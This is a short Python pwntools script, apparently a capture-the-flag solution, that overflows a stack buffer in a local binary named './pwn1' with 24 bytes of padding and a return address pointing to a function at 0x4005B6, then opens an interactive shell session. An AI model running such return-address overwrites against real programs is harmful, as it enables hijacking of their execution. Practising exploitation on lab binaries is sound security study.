from pwn import*
io=process('./pwn1')

bd_addr=0x4005B6
payload=cyclic(16+8)+p64(bd_addr)
io.sendline(payload)
io.interactive()